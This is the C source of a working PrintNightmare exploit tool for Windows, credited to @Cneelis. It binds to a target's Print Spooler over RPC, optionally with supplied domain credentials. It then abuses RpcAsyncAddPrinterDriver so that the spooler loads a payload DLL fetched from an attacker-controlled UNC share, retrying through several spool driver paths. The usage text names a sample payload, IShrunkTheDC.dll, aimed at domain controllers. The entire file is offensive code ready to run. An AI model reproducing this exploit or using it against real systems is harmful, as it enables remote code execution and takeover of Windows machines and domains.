#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <windows.h> 
#include <stdio.h>
#include <shlwapi.h>

#include "ms-par.h"
#include "PrintNightmare.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "Shlwapi.lib")

#define MAX_BUF 512

EXTERN_C void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len) {
	return(malloc(len));
}

EXTERN_C void __RPC_USER midl_user_free(void __RPC_FAR * ptr) {
	free(ptr);
}

void Usage(LPWSTR lpProgram) {
	wprintf(L" [>] %s <target ip or hostname> <UNC path to payload Dll>\n", lpProgram);
	wprintf(L" [>] Example: %s 192.168.1.10 \\\\192.168.1.133\\Honey\\IShrunkTheDC.dll\n\n", lpProgram);
	wprintf(L" [>] Or when using alternative creds instead of current token:\n");
	wprintf(L" [>] %s <target ip or hostname> <UNC path to payload Dll> <domain> <username> <password>\n", lpProgram);
	wprintf(L" [>] Example: %s 192.168.1.10 \\\\192.168.1.133\\Honey\\IShrunkTheDC.dll blaat.local kermit ThisIsFine!\n\n", lpProgram);
}

RPC_STATUS CreateBindingHandle(IN LPWSTR lpwDomainname, IN LPWSTR lpwUsername, IN LPWSTR lpwPassword, IN LPWSTR lpwTarget, OUT RPC_BINDING_HANDLE *binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;
	SEC_WINNT_AUTH_IDENTITY AuthIdentity = { 0 };

	StringBinding = 0;
	Binding = 0;

	rStatus = RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-abcd-ef00-0123456789ab", (RPC_WSTR)L"ncacn_ip_tcp", (RPC_WSTR)lpwTarget, (RPC_WSTR)NULL, (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!rStatus) {
			if (lpwUsername != NULL) {
				SecurityQOS.Version = 1;
				SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
				SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
				SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;

				AuthIdentity.Domain = (unsigned short*)lpwDomainname;
				AuthIdentity.DomainLength = lstrlenW(lpwDomainname);
				AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
				AuthIdentity.User = (unsigned short*)lpwUsername;
				AuthIdentity.UserLength = lstrlenW(lpwUsername);
				AuthIdentity.Password = (unsigned short*)lpwPassword;
				AuthIdentity.PasswordLength = lstrlenW(lpwPassword);

				rStatus = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, &AuthIdentity, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			}
			else {
				SecurityQOS.Version = 1;
				SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
				SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
				SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

				rStatus = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			}

			rStatus = RpcBindingSetObject(Binding, (UUID *)&PAR_ObjectUUID);
			if (rStatus == RPC_S_OK) {
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				wprintf(L"\n [>] RPC Binding successful\n");
			}
		}
	}

	if (Binding) {
		RpcBindingFree(&Binding);
	}
			
	return rStatus;
}

LPWSTR GetDriverPath(IN RPC_BINDING_HANDLE Binding, IN LPWSTR pEnvironment) {
	DWORD dwResult = 0;
	LPWSTR lpwDriverPath = NULL;
	LPWSTR lpwFullDriverPath = NULL;
	DWORD dwNeeded = 0, dwReturned = 0;
	PRPC_DRIVER_INFO_2 pDrvInfo2 = NULL;

	lpwDriverPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_BUF * sizeof(WCHAR));
	if (lpwDriverPath == NULL) {
		return NULL;
	}

	//Find required buffer size
	RpcAsyncEnumPrinterDrivers(Binding, NULL, pEnvironment, 2, NULL, 0, &dwNeeded, &dwReturned);
	if (dwNeeded > 0) {
		pDrvInfo2 = (PRPC_DRIVER_INFO_2)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNeeded);
	}

	if (pDrvInfo2 != NULL) {
		dwResult = RpcAsyncEnumPrinterDrivers(Binding, NULL, pEnvironment, 2, (BYTE*)pDrvInfo2, dwNeeded, &dwNeeded, &dwReturned);
		wprintf(L" [>] RpcAsyncEnumPrinterDrivers Errorcode: %d\n", dwResult);
		if (dwResult == ERROR_SUCCESS) {
			for (DWORD i = 0; i < dwReturned; i++) {
				lpwFullDriverPath = (LPWSTR)(pDrvInfo2[i].DriverPathOffset ? (PBYTE)&pDrvInfo2[i] + pDrvInfo2[i].DriverPathOffset : NULL);
				if (lpwFullDriverPath) {
					if (StrStrIW(lpwFullDriverPath, L"ntprint.inf_amd64")) {
						if (PathRemoveFileSpec(lpwFullDriverPath)) {
							wcscpy_s(lpwDriverPath, MAX_BUF, lpwFullDriverPath);
							wcscat_s(lpwDriverPath, MAX_BUF, L"\\UNIDRV.DLL");
							wprintf(L" [>] pDriverPath:  -> %s\n\n", lpwDriverPath);
							break;
						}
					}
				}
			}
		}
	}

	if (pDrvInfo2 != NULL) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pDrvInfo2);
	}

	return lpwDriverPath;
}

int wmain(int argc, wchar_t* argv[]) {
	DWORD dwResult = 0;
	LPWSTR lpwTarget = NULL;
	LPWSTR lpwShare = NULL;
	LPWSTR lpwPayload = NULL;
	LPWSTR lpwDomainname = NULL;
	LPWSTR lpwUsername = NULL;
	LPWSTR lpwPassword = NULL;
	LPWSTR lpwDriverPath = NULL;
	
	UNICODE_STRING uUNCShare = { 0 };
	WCHAR wcUNCShare[MAX_BUF] = { 0 };

	WCHAR wcRPCTarget[MAX_BUF] = L"\\\\";
	WCHAR wcDestPad[MAX_BUF] = { 0 };

	DRIVER_INFO_2 info = { 0 };
	DRIVER_CONTAINER container_info = { 0 };
	RPC_BINDING_HANDLE bHandle;
	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;

	_RtlDosPathNameToRelativeNtPathName_U RtlDosPathNameToRelativeNtPathName_U = (_RtlDosPathNameToRelativeNtPathName_U)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlDosPathNameToRelativeNtPathName_U");
	if (RtlDosPathNameToRelativeNtPathName_U == NULL) {
		return 0;
	}

	wprintf(L" [>] PrintNightmare exploit by @Cneelis\n\n");
	if (argc < 3 || argc > 6) {
		Usage(argv[0]);
		return 0;
	}
	else {
		lpwTarget = argv[1];
		lpwShare = argv[2];
	}

	if (!RtlDosPathNameToRelativeNtPathName_U(lpwShare, &uUNCShare, &lpwPayload, NULL)) {
		wprintf(L"\n [!] Failed to convert SharePath...\n\n");
		return 0;
	}

	wcscpy_s(wcUNCShare, uUNCShare.MaximumLength, uUNCShare.Buffer);
	wprintf(L" [>] Target system -> %ls\n", lpwTarget);
	wprintf(L" [>] Payload share -> %ls\n", wcUNCShare);

	if (argc == 6) {
		lpwDomainname = argv[3];
		lpwUsername = argv[4];
		lpwPassword = argv[5];

		wprintf(L" [>] Domainname    -> %ls\n", lpwDomainname);
		wprintf(L" [>] Username      -> %ls\n", lpwUsername);
		wprintf(L" [>] Password      -> %ls\n", lpwPassword);
	}

	rStatus = CreateBindingHandle(lpwDomainname, lpwUsername, lpwPassword, lpwTarget, &bHandle);
	if (rStatus != RPC_S_OK) {
		wprintf(L"\n [!] RPC Binding failed...\n\n");
		goto CleanUp;
	}

	info.cVersion = 3;
	info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
	info.pDataFile = wcUNCShare;
	info.pEnvironment = (LPWSTR)L"Windows x64";
	info.pName = (LPWSTR)L"Microsoft Print to RCE";

	lpwDriverPath = GetDriverPath(bHandle, info.pEnvironment);
	if (lpwDriverPath == NULL) {
		wprintf(L"\n [!] Failed to enumerate DriverPath...\n\n");
		goto CleanUp;
	}

	info.pDriverPath = (LPWSTR)lpwDriverPath;

	container_info.Level = 2;
	container_info.DriverInfo.Level2 = (DRIVER_INFO_2*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DRIVER_INFO_2));
	container_info.DriverInfo.Level2->cVersion = 3;
	container_info.DriverInfo.Level2->pConfigFile = info.pConfigFile;
	container_info.DriverInfo.Level2->pDataFile = info.pDataFile;
	container_info.DriverInfo.Level2->pDriverPath = info.pDriverPath;
	container_info.DriverInfo.Level2->pEnvironment = info.pEnvironment;
	container_info.DriverInfo.Level2->pName = info.pName;

	wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);	
	
	RpcTryExcept{
		dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
		if (dwResult == 0) {
			wprintf(L" [>] RpcAsyncAddPrinterDriver Errorcode: %d\n", dwResult);
			wprintf(L" [>] Spooler copy  -> %ls\n", container_info.DriverInfo.Level2->pDataFile);
		}

		wsprintf(wcDestPad, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\%ls", lpwPayload);
		container_info.DriverInfo.Level2->pConfigFile = wcDestPad;
		
		dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
		wprintf(L" [>] Try to load   -> %ls, Errorcode: %d\n", container_info.DriverInfo.Level2->pConfigFile, dwResult);
		if (dwResult == 0) {
			wprintf(L"\n [>] Exploit successful.\n\n");
			goto CleanUp;
		}

		wsprintf(wcDestPad, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2\\%ls", lpwPayload);
		container_info.DriverInfo.Level2->pConfigFile = wcDestPad;

		dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
		wprintf(L" [>] Try to load   -> %ls, Errorcode: %d\n", container_info.DriverInfo.Level2->pConfigFile, dwResult);
		if (dwResult == 0) {
			wprintf(L"\n [>] Exploit successful.\n\n");
			goto CleanUp;
		}

		wsprintf(wcDestPad, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\3\\%ls", lpwPayload);
		container_info.DriverInfo.Level2->pConfigFile = wcDestPad;

		dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
		wprintf(L" [>] Try to load   -> %ls, Errorcode: %d\n", container_info.DriverInfo.Level2->pConfigFile, dwResult);
		if (dwResult == 0) {
			wprintf(L"\n [>] Exploit successful.\n\n");
			goto CleanUp;
		}

		wprintf(L"\n [>] Exploit failed...\n\n");
	}
	RpcExcept(1) {
		rStatus = RpcExceptionCode();
		wprintf(L"\n [!] RPC Error: %d\n\n", rStatus);
	}
	RpcEndExcept

CleanUp:

	if (container_info.DriverInfo.Level2 != NULL) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, container_info.DriverInfo.Level2);
	}

	if (lpwDriverPath != NULL) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpwDriverPath);
	}

    return 0;
}
